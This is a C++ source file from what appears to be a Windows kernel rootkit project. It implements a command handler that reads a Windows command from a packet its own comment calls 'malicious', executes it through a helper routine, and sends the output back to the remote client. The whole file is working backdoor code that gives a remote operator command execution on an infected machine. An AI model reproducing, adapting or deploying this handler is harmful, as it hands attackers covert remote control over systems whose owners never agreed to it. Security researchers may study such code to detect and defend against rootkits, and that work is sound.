/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "CommandPacketHandler.h"
#include "Utils.h"

/**
    Runs a Windows command.
    @param FullPacket - Pointer to the full malicious packet. Must have the GENERIC_BUFFER_PACKET structure.
    @return Whether or not running the command was successful.
*/
NTSTATUS
CommandPacketHandler::ProcessPacket (
    _In_ PBASE_PACKET FullPacket
    )
{
    NTSTATUS status;
    PGENERIC_BUFFER_PACKET commandPacket;
    PGENERIC_BUFFER_PACKET responsePacket;

    //
    // Cast the FullPacket to a XOR packet.
    //
    commandPacket = RCAST<PGENERIC_BUFFER_PACKET>(FullPacket);

    //
    // Allocate space for a response.
    //
    responsePacket = RCAST<PGENERIC_BUFFER_PACKET>(ExAllocatePoolWithTag(NonPagedPool, GENERIC_BUFFER_PACKET_SIZE(MAX_RESPONSE_SIZE), COMMAND_RESPONSE_TAG));
    if (responsePacket == NULL)
    {
        DBGPRINT("CommandPacketHandler!ProcessPacket: Failed to allocate space for the response packet.");
        status = STATUS_NO_MEMORY;
        goto Exit;
    }
    memset(responsePacket, 0, GENERIC_BUFFER_PACKET_SIZE(MAX_RESPONSE_SIZE));

    responsePacket->Base.PacketLength = GENERIC_BUFFER_PACKET_SIZE(MAX_RESPONSE_SIZE);
    responsePacket->Base.Type = PACKET_TYPE::Command;
    responsePacket->BufferSize = MAX_RESPONSE_SIZE;

    //
    // Execute the command.
    //
    status = Utilities::RunCommand(commandPacket->Buffer, commandPacket->BufferSize, DEFAULT_COMMAND_TIMEOUT, RCAST<BYTE*>(&responsePacket->Buffer), &responsePacket->BufferSize);
    if (NT_SUCCESS(status) == FALSE)
    {
        DBGPRINT("CommandPacketHandler!ProcessPacket: Failed to execute command with status 0x%X.", status);
        goto Exit;
    }
Exit:
    if (responsePacket)
    {
        if (NT_SUCCESS(status) == FALSE)
        {
            //
            // If we couldn't execute the command, return nothing.
            //
            responsePacket->BufferSize = 0;
            responsePacket->Base.PacketLength = GENERIC_BUFFER_PACKET_SIZE(0);
        }
        //
        // Send the command result to the client.
        //
        if (this->PacketDispatch->SendBuffer(responsePacket, GENERIC_BUFFER_PACKET_SIZE(responsePacket->BufferSize)) == FALSE)
        {
            DBGPRINT("CommandPacketHandler!ProcessPacket: Failed to send command response.");
            status = STATUS_ABANDONED;
            goto Exit;
        }
        ExFreePoolWithTag(responsePacket, COMMAND_RESPONSE_TAG);
    }
    return status;
}